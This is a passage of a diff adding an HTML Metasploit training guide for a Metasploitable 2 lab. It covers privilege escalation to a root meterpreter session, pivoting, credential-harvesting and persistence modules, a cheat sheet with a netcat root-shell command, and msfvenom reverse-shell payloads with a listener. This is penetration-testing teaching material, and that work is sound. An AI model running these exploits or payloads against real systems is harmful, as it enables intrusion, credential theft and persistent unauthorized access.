+<span class="success">[+] exploit/linux/local/sock_sendpage — The target appears to be vulnerable</span>
+
+<span class="comment"># Step 3: Use suggested exploit</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/linux/local/udev_netlink</span>
+<span class="prompt">msf6 exploit(udev_netlink) &gt;</span> <span class="cmd">set SESSION 1</span>
+<span class="prompt">msf6 exploit(udev_netlink) &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 exploit(udev_netlink) &gt;</span> <span class="cmd">run</span>
+<span class="success">[*] Meterpreter session 2 opened (root)</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">getuid</span>
+<span class="success">Server username: uid=0, gid=0, euid=0, egid=0</span>
+      </div>
+    </div>
+
+    <h2>Pivoting — Reaching Hidden Networks</h2>
+    <div class="info-box note">
+      <strong>ℹ CONCEPT</strong>
+      Pivoting uses a compromised host as a relay to attack machines on internal networks not directly accessible from your attacker machine. MSF supports TCP pivoting via Meterpreter routes and SOCKS proxies.
+    </div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Network Pivoting via Meterpreter</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Discover other subnets from compromised host</span>
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">ifconfig</span>
+<span class="output">Interface 2: eth1 — 10.10.10.1/24   ← Internal subnet!</span>
+
+<span class="prompt">meterpreter &gt;</span> <span class="cmd">background</span>
+
+<span class="comment"># Add a route through the compromised session</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">route add 10.10.10.0/24 1</span>
+<span class="success">[*] Route added</span>
+
+<span class="comment"># OR use autoroute post module</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use post/multi/manage/autoroute</span>
+<span class="prompt">msf6 post(autoroute) &gt;</span> <span class="cmd">set SESSION 1</span>
+<span class="prompt">msf6 post(autoroute) &gt;</span> <span class="cmd">run</span>
+
+<span class="comment"># Now scan internal subnet through the pivot</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/scanner/portscan/tcp</span>
+<span class="prompt">msf6 aux(tcp) &gt;</span> <span class="cmd">set RHOSTS 10.10.10.0/24</span>
+<span class="prompt">msf6 aux(tcp) &gt;</span> <span class="cmd">set PORTS 22,80,443,445,3389</span>
+<span class="prompt">msf6 aux(tcp) &gt;</span> <span class="cmd">run</span>
+
+<span class="comment"># SOCKS Proxy for non-MSF tools (nmap, curl, etc.)</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use auxiliary/server/socks_proxy</span>
+<span class="prompt">msf6 aux(socks_proxy) &gt;</span> <span class="cmd">set SRVHOST 127.0.0.1</span>
+<span class="prompt">msf6 aux(socks_proxy) &gt;</span> <span class="cmd">set SRVPORT 1080</span>
+<span class="prompt">msf6 aux(socks_proxy) &gt;</span> <span class="cmd">set VERSION 5</span>
+<span class="prompt">msf6 aux(socks_proxy) &gt;</span> <span class="cmd">run -j</span>
+<span class="comment"># Then: proxychains nmap 10.10.10.2</span>
+      </div>
+    </div>
+
+    <h2>Key Post-Exploitation Modules</h2>
+    <div class="grid grid-2">
+      <div class="card red">
+        <div class="card-num">CREDENTIALS</div>
+        <h3>Credential Harvesting</h3>
+        <div class="terminal" style="margin-top:10px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">post/linux/gather/hashdump</span><br>
+            <span class="module-name">post/multi/gather/ssh_creds</span><br>
+            <span class="module-name">post/linux/gather/credentials/</span>
+          </div>
+        </div>
+      </div>
+      <div class="card blue">
+        <div class="card-num">ENUMERATION</div>
+        <h3>System Enumeration</h3>
+        <div class="terminal" style="margin-top:10px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">post/linux/gather/enum_system</span><br>
+            <span class="module-name">post/linux/gather/enum_network</span><br>
+            <span class="module-name">post/multi/gather/env</span>
+          </div>
+        </div>
+      </div>
+      <div class="card yellow">
+        <div class="card-num">PERSISTENCE</div>
+        <h3>Maintaining Access</h3>
+        <div class="terminal" style="margin-top:10px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">post/linux/manage/sshkey_persistence</span><br>
+            <span class="module-name">post/linux/manage/cron_persistence</span><br>
+            <span class="module-name">post/linux/busybox/add_user</span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-num">LATERAL MOVEMENT</div>
+        <h3>Lateral Access</h3>
+        <div class="terminal" style="margin-top:10px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">post/multi/manage/autoroute</span><br>
+            <span class="module-name">auxiliary/scanner/portscan/tcp</span><br>
+            <span class="module-name">auxiliary/server/socks_proxy</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 9: CHEAT SHEET ─── -->
+  <section id="cheatsheet" class="section">
+    <div class="section-header">
+      <div class="section-icon">📋</div>
+      <div>
+        <div class="section-title">MASTER CHEAT SHEET</div>
+        <div class="section-desc">Quick reference for every phase of exploitation</div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// CONSOLE NAVIGATION</div>
+      <div class="cheat-grid">
+        <div class="cheat-item"><span class="cheat-cmd">msfconsole</span><span class="cheat-desc">Launch MSF console</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">msfconsole -q</span><span class="cheat-desc">Launch without banner</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">msfconsole -r file.rc</span><span class="cheat-desc">Run resource script</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">msf &gt; exit</span><span class="cheat-desc">Exit console</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">msf &gt; back</span><span class="cheat-desc">Exit current module</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Ctrl+Z</span><span class="cheat-desc">Background session</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Ctrl+C</span><span class="cheat-desc">Abort running module</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">msf &gt; makerc file.rc</span><span class="cheat-desc">Save command history as RC script</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// DATABASE OPERATIONS</div>
+      <div class="cheat-grid">
+        <div class="cheat-item"><span class="cheat-cmd">db_status</span><span class="cheat-desc">Check DB connection</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">workspace -a NAME</span><span class="cheat-desc">Create workspace</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">db_nmap -sV TARGET</span><span class="cheat-desc">Nmap scan to DB</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">hosts -c address,os</span><span class="cheat-desc">List host fields</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">services -p 80,443</span><span class="cheat-desc">Filter by port</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">vulns</span><span class="cheat-desc">List known vulns</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">creds</span><span class="cheat-desc">Captured credentials</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">db_export -f xml out.xml</span><span class="cheat-desc">Export DB to XML</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// MODULE OPERATIONS</div>
+      <div class="cheat-grid">
+        <div class="cheat-item"><span class="cheat-cmd">search type:exploit</span><span class="cheat-desc">Search by type</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">search cve:2023-XXXX</span><span class="cheat-desc">Search by CVE</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">use 0</span><span class="cheat-desc">Use module by index</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">info</span><span class="cheat-desc">Module information</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">show options</span><span class="cheat-desc">Required options</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">show advanced</span><span class="cheat-desc">Advanced options</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">show payloads</span><span class="cheat-desc">Compatible payloads</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">check</span><span class="cheat-desc">Check if vulnerable</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// METERPRETER QUICK-REF</div>
+      <div class="cheat-grid">
+        <div class="cheat-item"><span class="cheat-cmd">sysinfo</span><span class="cheat-desc">System information</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">getuid / getpid</span><span class="cheat-desc">Current user / PID</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">hashdump</span><span class="cheat-desc">Dump password hashes</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">migrate PID</span><span class="cheat-desc">Migrate to process</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">download FILE</span><span class="cheat-desc">Download file from target</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">upload FILE</span><span class="cheat-desc">Upload file to target</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">portfwd add -l LOCAL -p REMOTE -r HOST</span><span class="cheat-desc">Port forward</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">run post/MODULE</span><span class="cheat-desc">Run post module</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// METASPLOITABLE 2 QUICK-WIN MAP</div>
+      <div class="cheat-grid">
+        <div class="cheat-item"><span class="cheat-cmd">Port 21 → vsftpd_234_backdoor</span><span class="cheat-desc">Direct root shell</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 445 → usermap_script</span><span class="cheat-desc">Samba RCE → root</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 6667 → unreal_ircd_3281_backdoor</span><span class="cheat-desc">IRCd RCE</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 1524 → nc 192.168.56.102 1524</span><span class="cheat-desc">Instant root shell</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 8180 → tomcat_mgr_upload</span><span class="cheat-desc">WAR deploy shell</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 5432 → postgres_payload</span><span class="cheat-desc">PostgreSQL RCE</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 3306 → No password</span><span class="cheat-desc">Direct MySQL root</span></div>
+        <div class="cheat-item"><span class="cheat-cmd">Port 5900 → VNC password: "password"</span><span class="cheat-desc">GUI desktop access</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-section">
+      <div class="cheat-title">// GENERATE PAYLOADS WITH MSFVENOM</div>
+      <div class="terminal">
+        <div class="terminal-body">
+<span class="comment"># Linux ELF reverse shell</span>
+<span class="prompt">$</span> <span class="cmd">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf &gt; shell.elf</span>
+
+<span class="comment"># Windows EXE</span>
+<span class="prompt">$</span> <span class="cmd">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 -f exe &gt; shell.exe</span>
+
+<span class="comment"># PHP web shell</span>
+<span class="prompt">$</span> <span class="cmd">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw &gt; shell.php</span>
+
+<span class="comment"># JSP for Tomcat</span>
+<span class="prompt">$</span> <span class="cmd">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw &gt; shell.jsp</span>
+
+<span class="comment"># WAR file for Tomcat manager</span>
+<span class="prompt">$</span> <span class="cmd">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war &gt; shell.war</span>
+
+<span class="comment"># Set up listener for any of the above</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">use exploit/multi/handler</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set LHOST 192.168.56.101</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">set LPORT 4444</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">run -j</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box warning">
+      <strong>⚠ STUDY NOTES</strong>
+      Master these in order: (1) Lab setup + connectivity verification → (2) Nmap/db_nmap scanning → (3) One exploit at a time on Metasploitable 2 → (4) Meterpreter post-exploitation → (5) Pivoting → (6) msfvenom payload crafting. Build muscle memory through repetition in the lab before moving to CTFs like HackTheBox or TryHackMe.
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <span style="color:var(--green)">METASPLOIT MASTERY GUIDE</span> — FOR AUTHORIZED PENETRATION TESTING ONLY<br>
+  <span style="margin-top:6px;display:inline-block">Always obtain written authorization before testing any system. Never use these techniques on systems you do not own.</span>
+</footer>
+
+<script>
+  function showSection(id, btn) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    btn.classList.add('active');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function toggleExploit(header) {
+    const body = header.nextElementSibling;
+    const arrow = header.querySelector('span:last-child');
+    body.classList.toggle('open');
+    arrow.textContent = body.classList.contains('open') ? '▲' : '▼';
+  }
+</script>
+</body>
+</html>
